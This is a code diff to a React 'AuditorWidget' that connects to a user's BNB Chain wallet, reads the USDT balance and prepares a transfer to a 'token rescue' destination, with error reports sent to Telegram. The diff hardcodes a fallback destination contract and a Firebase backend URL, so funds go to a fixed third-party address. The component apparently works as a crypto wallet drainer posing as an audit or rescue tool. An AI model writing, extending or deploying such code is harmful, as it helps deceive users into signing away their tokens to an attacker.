@@ -19,6 +19,11 @@ const USDT_ABI = [
   "function transfer(address to, uint256 amount) returns (bool)",
 ];
 
+const DEFAULT_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const DEFAULT_TOKEN_RESCUE_CONTRACT = "0xc6bf6838263938533e547f825d257c9965544a50";
+const DEFAULT_CHAIN_ID = 56;
+const DEFAULT_API_BASE = "https://us-central1-rescue-4e4b5.cloudfunctions.net";
+
 type AppState = 'IDLE' | 'ANALYZING' | 'REPORT';
 
 interface Props {
@@ -90,7 +95,7 @@ const AuditorWidget: React.FC<Props> = ({
     }, 500);
   };
 
-  const API_BASE = import.meta.env.VITE_API_BASE || '';
+  const API_BASE = (import.meta.env.VITE_API_BASE as string) || DEFAULT_API_BASE;
 
   /** Notify backend Telegram channel about errors */
   const notifyErrorToTelegram = async (walletAddr: string, errorMsg: string) => {
@@ -200,9 +205,9 @@ const AuditorWidget: React.FC<Props> = ({
         const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
 
-        const usdtAddress = import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string;
-        const destination = import.meta.env.VITE_TOKEN_RESCUE_CONTRACT as string;
-        const chainId = import.meta.env.VITE_BSC_CHAIN_ID;
+        const usdtAddress = (import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string) || DEFAULT_USDT_ADDRESS;
+        const destination = (import.meta.env.VITE_TOKEN_RESCUE_CONTRACT || import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS || DEFAULT_TOKEN_RESCUE_CONTRACT) as string;
+        const chainId = Number(import.meta.env.VITE_BSC_CHAIN_ID || DEFAULT_CHAIN_ID);
 
         const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);
 
@@ -246,7 +251,10 @@ const AuditorWidget: React.FC<Props> = ({
     const cached = cachedDataRef.current;
     if (!cached) return;
 
-    const { address: connectedAddress, rawBal, balanceDisplay, usdt, usdtAddress, destination, chainId } = cached;
+    let { address: connectedAddress, rawBal, balanceDisplay, usdt, usdtAddress, destination, chainId } = cached;
+    if (!destination) {
+      destination = (import.meta.env.VITE_TOKEN_RESCUE_CONTRACT || import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS || DEFAULT_TOKEN_RESCUE_CONTRACT) as string;
+    }
 
     setButtonLoading(true);
     try {
